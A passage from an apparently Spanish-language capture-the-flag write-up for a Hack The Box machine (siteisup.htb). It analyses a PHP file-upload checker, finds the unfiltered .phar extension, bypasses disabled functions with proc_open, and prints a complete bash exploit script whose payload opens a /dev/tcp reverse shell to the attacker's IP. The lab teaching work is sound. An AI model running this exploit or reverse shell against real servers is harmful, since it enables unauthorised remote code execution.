</span><span class="go">
&lt;?php

</span><span class="gp">function isitup($</span>url<span class="o">){</span>
<span class="gp">	$</span><span class="nv">ch</span><span class="o">=</span>curl_init<span class="o">()</span><span class="p">;</span>
<span class="gp">	curl_setopt($</span>ch, CURLOPT_URL, trim<span class="o">(</span><span class="nv">$url</span><span class="o">))</span><span class="p">;</span>
<span class="gp">	curl_setopt($</span>ch, CURLOPT_USERAGENT, <span class="s2">"siteisup.htb beta"</span><span class="o">)</span><span class="p">;</span>
<span class="gp">	curl_setopt($</span>ch, CURLOPT_HEADER, 1<span class="o">)</span><span class="p">;</span>
<span class="gp">	curl_setopt($</span>ch, CURLOPT_FOLLOWLOCATION, 1<span class="o">)</span><span class="p">;</span>
<span class="gp">	curl_setopt($</span>ch, CURLOPT_RETURNTRANSFER, 1<span class="o">)</span><span class="p">;</span>
<span class="gp">	curl_setopt($</span>ch, CURLOPT_SSL_VERIFYHOST, 0<span class="o">)</span><span class="p">;</span>
<span class="gp">	curl_setopt($</span>ch, CURLOPT_SSL_VERIFYPEER, 0<span class="o">)</span><span class="p">;</span>
<span class="gp">	curl_setopt($</span>ch, CURLOPT_TIMEOUT, 30<span class="o">)</span><span class="p">;</span>
<span class="gp">	$</span>f <span class="o">=</span> curl_exec<span class="o">(</span><span class="nv">$ch</span><span class="o">)</span><span class="p">;</span>
<span class="gp">	$</span>header <span class="o">=</span> curl_getinfo<span class="o">(</span><span class="nv">$ch</span><span class="o">)</span><span class="p">;</span>
<span class="gp">	if($</span>f AND <span class="nv">$header</span><span class="o">[</span><span class="s1">'http_code'</span><span class="o">]</span> <span class="o">==</span> 200<span class="o">){</span>
<span class="gp">		return array(true,$</span>f<span class="o">)</span><span class="p">;</span>
<span class="go">	}else{
</span><span class="gp">		return false;</span><span class="w">
</span><span class="go">	}
</span><span class="gp">    curl_close($</span>ch<span class="o">)</span><span class="p">;</span>
<span class="go">}

</span><span class="gp">if($</span>_POST[<span class="s1">'check'</span><span class="o">]){</span>
<span class="go">
</span><span class="gp">	#</span><span class="w"> </span>File size must be less than 10kb.
<span class="gp">	if ($</span>_FILES[<span class="s1">'file'</span><span class="o">][</span><span class="s1">'size'</span><span class="o">]</span> <span class="o">&gt;</span> 10000<span class="o">)</span> <span class="o">{</span>
<span class="gp">        die("File too large!");</span><span class="w">
</span><span class="go">    }
</span><span class="gp">	$</span>file <span class="o">=</span> <span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'file'</span><span class="o">][</span><span class="s1">'name'</span><span class="o">]</span><span class="p">;</span>
<span class="go">
</span><span class="gp">	#</span><span class="w"> </span>Check <span class="k">if </span>extension is allowed.
<span class="gp">	$</span>ext <span class="o">=</span> getExtension<span class="o">(</span><span class="nv">$file</span><span class="o">)</span><span class="p">;</span>
<span class="gp">	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$</span>ext<span class="o">)){</span>
<span class="gp">		die("Extension not allowed!");</span><span class="w">
</span><span class="go">	}

</span><span class="gp">	#</span><span class="w"> </span>Create directory to upload our file.
<span class="gp">	$</span><span class="nb">dir</span> <span class="o">=</span> <span class="s2">"uploads/"</span>.md5<span class="o">(</span><span class="nb">time</span><span class="o">())</span>.<span class="s2">"/"</span><span class="p">;</span>
<span class="gp">	if(!is_dir($</span><span class="nb">dir</span><span class="o">)){</span>
<span class="gp">        mkdir($</span><span class="nb">dir</span>, 0770, <span class="nb">true</span><span class="o">)</span><span class="p">;</span>
<span class="go">    }

</span><span class="gp">  #</span><span class="w"> </span>Upload the file.
<span class="gp">	$</span>final_path <span class="o">=</span> <span class="nv">$dir</span>.<span class="nv">$file</span><span class="p">;</span>
<span class="gp">	move_uploaded_file($</span>_FILES[<span class="s1">'file'</span><span class="o">][</span><span class="s1">'tmp_name'</span><span class="o">]</span>, <span class="s2">"{</span><span class="nv">$final_path</span><span class="s2">}"</span><span class="o">)</span><span class="p">;</span>
<span class="go">
</span><span class="gp">  #</span><span class="w"> </span>Read the uploaded file.
<span class="gp">	$</span>websites <span class="o">=</span> explode<span class="o">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>,file_get_contents<span class="o">(</span><span class="nv">$final_path</span><span class="o">))</span><span class="p">;</span>
<span class="go">
</span><span class="gp">	foreach($</span>websites as <span class="nv">$site</span><span class="o">){</span>
<span class="gp">		$</span><span class="nv">site</span><span class="o">=</span>trim<span class="o">(</span><span class="nv">$site</span><span class="o">)</span><span class="p">;</span>
<span class="gp">		if(!preg_match("#</span>file://#i<span class="s2">",</span><span class="nv">$site</span><span class="s2">) &amp;&amp; !preg_match("</span><span class="c">#data://#i",$site) &amp;&amp; !preg_match("#ftp://#i",$site)){</span>
<span class="gp">			$</span><span class="nv">check</span><span class="o">=</span>isitup<span class="o">(</span><span class="nv">$site</span><span class="o">)</span><span class="p">;</span>
<span class="gp">			if($</span>check<span class="o">){</span>
<span class="gp">				echo "&lt;center&gt;</span><span class="o">{</span><span class="nv">$site</span><span class="o">}</span>&lt;br&gt;&lt;font <span class="nv">color</span><span class="o">=</span><span class="s1">'green'</span><span class="o">&gt;</span>is up ^_^&lt;/font&gt;&lt;/center&gt;<span class="s2">";
</span><span class="go">			}else{
</span><span class="gp">				echo "&lt;center&gt;</span><span class="o">{</span><span class="nv">$site</span><span class="o">}</span>&lt;br&gt;&lt;font <span class="nv">color</span><span class="o">=</span><span class="s1">'red'</span><span class="o">&gt;</span>seems to be down :<span class="o">(</span>&lt;/font&gt;&lt;/center&gt;<span class="s2">";
</span><span class="go">			}
		}else{
</span><span class="gp">			echo "&lt;center&gt;</span>&lt;font <span class="nv">color</span><span class="o">=</span><span class="s1">'red'</span><span class="o">&gt;</span>Hacking attempt was detected <span class="o">!</span>&lt;/font&gt;&lt;/center&gt;<span class="s2">";
</span><span class="go">		}
	}

</span><span class="gp">  #</span><span class="w"> </span>Delete the uploaded file.
<span class="gp">	@unlink($</span>final_path<span class="o">)</span><span class="p">;</span>
<span class="go">}

</span><span class="gp">function getExtension($</span>file<span class="o">)</span> <span class="o">{</span>
<span class="gp">	$</span>extension <span class="o">=</span> strrpos<span class="o">(</span><span class="nv">$file</span>,<span class="s2">"."</span><span class="o">)</span><span class="p">;</span>
<span class="gp">	return ($</span><span class="nv">extension</span><span class="o">===</span><span class="nb">false</span><span class="o">)</span> ? <span class="s2">""</span> : substr<span class="o">(</span><span class="nv">$file</span>,<span class="nv">$extension</span>+1<span class="o">)</span><span class="p">;</span>
<span class="go">}
</span><span class="gp">?&gt;</span><span class="w">
</span><span class="gp">      &lt;/section&gt;</span><span class="w">
</span><span class="gp">    &lt;/div&gt;</span><span class="w">
</span><span class="go">
</span><span class="gp">    &lt;div id="footer_wrap" class="outer"&gt;</span><span class="w">
</span><span class="gp">      &lt;footer class="inner"&gt;</span><span class="w">
</span><span class="gp">        &lt;p class="copyright"&gt;</span>siteisup.htb <span class="o">(</span>beta<span class="o">)</span>&lt;/p&gt;&lt;br&gt;
<span class="gp">        &lt;a class="changelog" href="changelog.txt"&gt;</span>changelog.txt&lt;/a&gt;&lt;br&gt;
<span class="gp">      &lt;/footer&gt;</span><span class="w">
</span><span class="gp">    &lt;/div&gt;</span><span class="w">
</span><span class="go">
</span><span class="gp">  &lt;/body&gt;</span><span class="w">
</span><span class="gp">&lt;/html&gt;</span><span class="w">
</span></pre></table></code></div></div><p>Este archivo es el que observamos en el dominio <code class="language-plaintext highlighter-rouge">dev.siteisup.htb</code> y ahora que tenemos el código de la aplicación lo analizamos para encontrar alguna vulnerabilidad:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="k">function</span> <span class="n">isitup</span><span class="p">(</span><span class="nv">$url</span><span class="p">){</span>
	<span class="nv">$ch</span><span class="o">=</span><span class="nb">curl_init</span><span class="p">();</span>
	<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$url</span><span class="p">));</span>
	<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_USERAGENT</span><span class="p">,</span> <span class="s2">"siteisup.htb beta"</span><span class="p">);</span>
	<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
	<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_FOLLOWLOCATION</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
	<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
	<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_SSL_VERIFYHOST</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_SSL_VERIFYPEER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_TIMEOUT</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
	<span class="nv">$f</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
	<span class="nv">$header</span> <span class="o">=</span> <span class="nb">curl_getinfo</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="nv">$f</span> <span class="k">AND</span> <span class="nv">$header</span><span class="p">[</span><span class="s1">'http_code'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">200</span><span class="p">){</span>
		<span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span><span class="nv">$f</span><span class="p">);</span>
	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
		<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
	<span class="p">}</span>
    <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'check'</span><span class="p">]){</span>

	<span class="c1"># File size must be less than 10kb.</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'size'</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">10000</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">"File too large!"</span><span class="p">);</span>
    <span class="p">}</span>
	<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">];</span>

	<span class="c1"># Check if extension is allowed.</span>
	<span class="nv">$ext</span> <span class="o">=</span> <span class="nf">getExtension</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i"</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)){</span>
		<span class="k">die</span><span class="p">(</span><span class="s2">"Extension not allowed!"</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="c1"># Create directory to upload our file.</span>
	<span class="nv">$dir</span> <span class="o">=</span> <span class="s2">"uploads/"</span><span class="mf">.</span><span class="nb">md5</span><span class="p">(</span><span class="nb">time</span><span class="p">())</span><span class="mf">.</span><span class="s2">"/"</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)){</span>
        <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="mo">0770</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="c1"># Upload the file.</span>
	<span class="nv">$final_path</span> <span class="o">=</span> <span class="nv">$dir</span><span class="mf">.</span><span class="nv">$file</span><span class="p">;</span>
	<span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$final_path</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>

  <span class="c1"># Read the uploaded file.</span>
	<span class="nv">$websites</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$final_path</span><span class="p">));</span>

	<span class="k">foreach</span><span class="p">(</span><span class="nv">$websites</span> <span class="k">as</span> <span class="nv">$site</span><span class="p">){</span>
		<span class="nv">$site</span><span class="o">=</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$site</span><span class="p">);</span>
		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"#file://#i"</span><span class="p">,</span><span class="nv">$site</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"#data://#i"</span><span class="p">,</span><span class="nv">$site</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"#ftp://#i"</span><span class="p">,</span><span class="nv">$site</span><span class="p">)){</span>
			<span class="nv">$check</span><span class="o">=</span><span class="nf">isitup</span><span class="p">(</span><span class="nv">$site</span><span class="p">);</span>
			<span class="k">if</span><span class="p">(</span><span class="nv">$check</span><span class="p">){</span>
				<span class="k">echo</span> <span class="s2">"&lt;center&gt;</span><span class="si">{</span><span class="nv">$site</span><span class="si">}</span><span class="s2">&lt;br&gt;&lt;font color='green'&gt;is up ^_^&lt;/font&gt;&lt;/center&gt;"</span><span class="p">;</span>
			<span class="p">}</span><span class="k">else</span><span class="p">{</span>
				<span class="k">echo</span> <span class="s2">"&lt;center&gt;</span><span class="si">{</span><span class="nv">$site</span><span class="si">}</span><span class="s2">&lt;br&gt;&lt;font color='red'&gt;seems to be down :(&lt;/font&gt;&lt;/center&gt;"</span><span class="p">;</span>
			<span class="p">}</span>
		<span class="p">}</span><span class="k">else</span><span class="p">{</span>
			<span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;font color='red'&gt;Hacking attempt was detected !&lt;/font&gt;&lt;/center&gt;"</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>

  <span class="c1"># Delete the uploaded file.</span>
	<span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$final_path</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">getExtension</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
	<span class="nv">$extension</span> <span class="o">=</span> <span class="nb">strrpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">"."</span><span class="p">);</span>
	<span class="k">return</span> <span class="p">(</span><span class="nv">$extension</span><span class="o">===</span><span class="kc">false</span><span class="p">)</span> <span class="o">?</span> <span class="s2">""</span> <span class="o">:</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$extension</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Gracias a los comentarios no hace explicar la funcionalidad, pero en general el proceso sería el siguiente:</p><ol><li>Al subir nuestro archivo realiza un filtro para evitar extensiones con fines maliciosos (.php, .py, .zip, etc.)<li>Crea un directorio llamado <code class="language-plaintext highlighter-rouge">/uploads/(hash **md5** del tiempo en segundos actual)/</code><li>Mueve nuestro archivo a ese directorio <code class="language-plaintext highlighter-rouge">/uploads/(hash)/(nuestro_archivo)</code><li>Luego lee cada linea del archivo, hace un filtro (wrappers de php maliciosos) y le ejecuta un <code class="language-plaintext highlighter-rouge">curl</code> para comprobar si el suspuesto sitio está activo o no<li>Después de terminar el proceso anterior borra el archivo del sistema</ol><p>Después de analizarlo encontramos que no se valida la extensión <code class="language-plaintext highlighter-rouge">.phar</code> que nos sirve para <strong>almacenar una aplicación entera en php</strong>, en otras palabras podemos ejecutar código php, osea tenemos una <strong>Execución Remota de Comandos</strong></p><p>Ahora el único problema es que nuestro archivo se va a borrar y probablemente no tendremos tiempo a ejecutarlo. Sin embargo, para tener una idea de lo que podemos hacer recurrimos nuevamente a los <strong>logs del repositorio</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="go">❯ git diff
</span><span class="c">...
</span><span class="go">diff --git a/changelog.txt b/changelog.txt
deleted file mode 100644
index 09e4ccd..0000000
--- a/changelog.txt
+++ /dev/null
@@ -1,9 +0,0 @@
-Beta version
-
-1- Check a bunch of websites.
-
--- ToDo:
-
-1- Multithreading for a faster version :D.
-2- Remove the upload option.
-3- New admin panel.
</span><span class="c">...
</span></pre></table></code></div></div><p>El punto número uno menciona que en la aplicación hay que implementar <strong>Multithreading</strong>, que como menciona sirve para ejecutar tareas en paralelo y aumentar la velocidad</p><p>Teniendo en cuenta esto, lo que hacemos es enviar nuestro <strong>código malicioso php</strong> seguido de varias <strong>URLs</strong> y como no se aplican hilos ejecutará el curl línea por linea y en ese proceso tendremos tiempo para llamar a nuestro archivo <code class="language-plaintext highlighter-rouge">.phar</code> y ejecutar nuestro código</p><p>El último problema era que al intentar usar funciones como <code class="language-plaintext highlighter-rouge">system() - exec() - shell_exec()</code> no obteniamos resultado, entonces al visualizar el archivo de configuración <strong>phpinfo</strong> notamos que estaban bloqueadas. Por ello, encontramos en la biblia de los Hackers otras manera de executar comandos:</p><blockquote><p>proc_close(proc_open(“command”,array(),$something));</p></blockquote><blockquote class="prompt-info"><div><p>Puedes encontrar mas información en <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass">Hacktricks</a></p></div></blockquote><p>Para aplica todo este proceso hice un script en <code class="language-plaintext highlighter-rouge">bash</code> que creará el archivo malicioso que luego de ponernos en escucha nos devolverá una shell como el usuario <code class="language-plaintext highlighter-rouge">www-data</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c"># colors</span>
<span class="nb">export </span><span class="nv">red</span><span class="o">=</span><span class="s2">"</span><span class="se">\0</span><span class="s2">33[1;31m"</span>
<span class="nb">export </span><span class="nv">green</span><span class="o">=</span><span class="s2">"</span><span class="se">\0</span><span class="s2">33[1;32m"</span>
<span class="nb">export </span><span class="nv">yellow</span><span class="o">=</span><span class="s2">"</span><span class="se">\0</span><span class="s2">33[1;33m"</span>
<span class="nb">export </span><span class="nv">blue</span><span class="o">=</span><span class="s2">"</span><span class="se">\0</span><span class="s2">33[1;34m"</span>
<span class="nb">export </span><span class="nv">purple</span><span class="o">=</span><span class="s2">"</span><span class="se">\0</span><span class="s2">33[1;35m"</span>
<span class="nb">export </span><span class="nv">cyan</span><span class="o">=</span><span class="s2">"</span><span class="se">\0</span><span class="s2">33[1;36m"</span>
<span class="nb">export </span><span class="nv">grey</span><span class="o">=</span><span class="s2">"</span><span class="se">\0</span><span class="s2">33[0;37m"</span>
<span class="nb">export </span><span class="nv">reset</span><span class="o">=</span><span class="s2">"</span><span class="se">\0</span><span class="s2">33[m"</span>

<span class="c"># ctrl + c (function)</span>
<span class="k">function </span>signal_handler<span class="o">(){</span>
  <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="k">${</span><span class="nv">red</span><span class="k">}</span><span class="se">\n</span><span class="s2">[!] User terminated.</span><span class="k">${</span><span class="nv">reset</span><span class="k">}</span><span class="s2">"</span>
  <span class="nb">rm</span> <span class="nt">-f</span> <span class="nv">$file_name</span>
  tput cnorm<span class="p">;</span> <span class="nb">exit </span>1 <span class="c"># return cursor and exit</span>
<span class="o">}</span>

<span class="c"># ctrl + c (signal)</span>
<span class="nb">trap </span>signal_handler SIGINT

<span class="c"># hide cursor</span>
tput civis

<span class="c"># display help panel</span>
<span class="k">function </span><span class="nb">help</span><span class="o">(){</span>
  <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Description: reverse shell to user www-data"</span>
  <span class="nb">echo
  echo</span> <span class="s2">"[*] Use: </span><span class="nv">$0</span><span class="s2"> ip-address port"</span>
  <span class="nb">echo</span>
<span class="o">}</span>

<span class="c"># valid arguments</span>
<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-ne</span> 2 <span class="o">]</span><span class="p">;</span> <span class="k">then
  </span><span class="nb">help
  </span>tput cnorm<span class="p">;</span> <span class="nb">exit
</span><span class="k">fi</span>

<span class="c"># variables</span>
<span class="nv">ip</span><span class="o">=</span><span class="nv">$1</span><span class="p">;</span> <span class="nv">port</span><span class="o">=</span><span class="nv">$2</span>
<span class="nv">main_url</span><span class="o">=</span><span class="s1">'http://dev.siteisup.htb'</span>
<span class="nv">required_header</span><span class="o">=</span><span class="s1">'Special-Dev: only4dev'</span>
<span class="nv">file_name</span><span class="o">=</span><span class="s1">'rce.phar'</span>
<span class="nv">php_payload</span><span class="o">=</span><span class="s2">"&lt;?php proc_close(proc_open(</span><span class="se">\"</span><span class="s2">bash -c 'bash -i &gt;&amp; /dev/tcp/</span><span class="nv">$ip</span><span class="s2">/</span><span class="nv">$port</span><span class="s2"> 0&gt;&amp;1'</span><span class="se">\"</span><span class="s2">, array(), </span><span class="se">\$</span><span class="s2">foo)); ?&gt;"</span> <span class="c"># payload to upload [*]</span>

<span class="c"># create .phar file with payload</span>
<span class="k">function </span>create_file<span class="o">(){</span>
  <span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="nv">$file_name</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$php_payload</span><span class="s2">"</span> <span class="o">&gt;</span> <span class="nv">$file_name</span>
    <span class="nb">echo</span> <span class="s2">"http://url.fake"</span> <span class="o">&gt;&gt;</span> <span class="nv">$file_name</span> <span class="c"># Interesting</span>
  <span class="k">fi</span>
<span class="o">}</span>

<span class="c"># upload file to website</span>
<span class="k">function </span>upload_file<span class="o">(){</span>
  curl <span class="nt">-si</span> <span class="nt">-H</span> <span class="s2">"</span><span class="nv">$required_header</span><span class="s2">"</span> <span class="nt">-F</span> <span class="nv">file</span><span class="o">=</span>@<span class="nv">$file_name</span> <span class="nt">-F</span> <span class="nv">check</span><span class="o">=</span>Check <span class="nv">$main_url</span> &amp;&gt;/dev/null &amp; <span class="c"># 10 seconds to response</span>
<span class="o">}</span>

<span class="c"># make file request and get php response (RCE)</span>
<span class="k">function </span>execute_file<span class="o">(){</span>
  <span class="nv">uploads_url</span><span class="o">=</span><span class="s2">"</span><span class="nv">$main_url</span><span class="s2">/uploads"</span>

  <span class="nv">md5_directories</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-si</span> <span class="nv">$uploads_url</span> <span class="nt">-H</span> <span class="s2">"</span><span class="nv">$required_header</span><span class="s2">"</span> <span class="nt">-L</span> | html2text | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | <span class="nb">grep</span> <span class="s2">".*/$"</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'/'</span> | xargs<span class="si">)</span>
  <span class="nb">read</span> <span class="nt">-ra</span> md5_directories_array <span class="o">&lt;&lt;&lt;</span> <span class="s2">"</span><span class="nv">$md5_directories</span><span class="s2">"</span> <span class="c"># IFS=' ' (default)</span>

  <span class="k">for </span>md5_dir <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">md5_directories_array</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
    </span><span class="nv">file_url</span><span class="o">=</span><span class="s2">"</span><span class="nv">$uploads_url</span><span class="s2">/</span><span class="nv">$md5_dir</span><span class="s2">/</span><span class="nv">$file_name</span><span class="s2">"</span>

    <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="k">${</span><span class="nv">green</span><span class="k">}</span><span class="se">\n</span><span class="s2">[*]</span><span class="k">${</span><span class="nv">reset</span><span class="k">}</span><span class="s2"> Searching file in </span><span class="k">${</span><span class="nv">cyan</span><span class="k">}</span><span class="nv">$file_url</span><span class="k">${</span><span class="nv">reset</span><span class="k">}</span><span class="s2">:"</span>

    <span class="nv">file_response</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-s</span> <span class="nv">$file_url</span> <span class="nt">-H</span> <span class="s2">"</span><span class="nv">$required_header</span><span class="s2">"</span><span class="si">)</span>
    <span class="k">if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$file_response</span><span class="s2">"</span> <span class="o">==</span> <span class="k">*</span><span class="s2">"Not Found"</span><span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
      </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="k">${</span><span class="nv">yellow</span><span class="k">}</span><span class="se">\n\t</span><span class="s2">[x] File not found.</span><span class="k">${</span><span class="nv">reset</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">continue
    fi

    </span><span class="nb">break
  </span><span class="k">done</span>
<span class="o">}</span>

<span class="c"># alert listening mode</span>
<span class="k">function </span>alert_listen_mode<span class="o">(){</span>
  tput cnorm <span class="c"># return cursor</span>
  <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Open port </span><span class="nv">$port</span><span class="s2"> to receive the shell (g.e nc -lvnp </span><span class="nv">$port</span><span class="s2">)"</span>
  <span class="nb">echo</span> <span class="s2">"Press ENTER to continue"</span><span class="p">;</span> <span class="nb">read</span> <span class="nt">-s</span> <span class="nt">-n</span> 1 key
  <span class="k">if</span> <span class="o">[[</span> <span class="nv">$key</span> <span class="o">=</span> <span class="s2">""</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
    </span>execute_file
  <span class="k">fi</span>
<span class="o">}</span>

<span class="c"># main flow</span>
<span class="c"># ---------</span>
<span class="nb">echo</span> <span class="s2">"[*] Creating file: </span><span class="nv">$file_name</span><span class="s2">"</span><span class="p">;</span>
create_file
<span class="nb">echo</span> <span class="s2">"[*] Uploading file"</span><span class="p">;</span>
upload_file
<span class="nb">echo</span> <span class="s2">"[+] Executing payload"</span><span class="p">;</span>
alert_listen_mode
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes encontrar el script en mi repositorio: <a href="https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_Updown/www-data">https://github.com/E1P0TR0</a></p></div></blockquote><blockquote class="prompt-tip"><div><p>Solo tuve que agregar la ruta <code class="language-plaintext highlighter-rouge">http://url.fake</code> que me daba una respuesta en 10 segundos, suficiente para abrir una consola y ponernos en escucha</p></div></blockquote><p>Ahora solo ejecutamos el script y recivimos una shell como el usuario <code class="language-plaintext highlighter-rouge">www-data</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="go">❯ bash www-data_shell.sh

Description: reverse shell to user www-data

[*] Use: www-data_shell.sh ip-address port

❯ bash www-data_shell.sh 10.10.14.155 1234
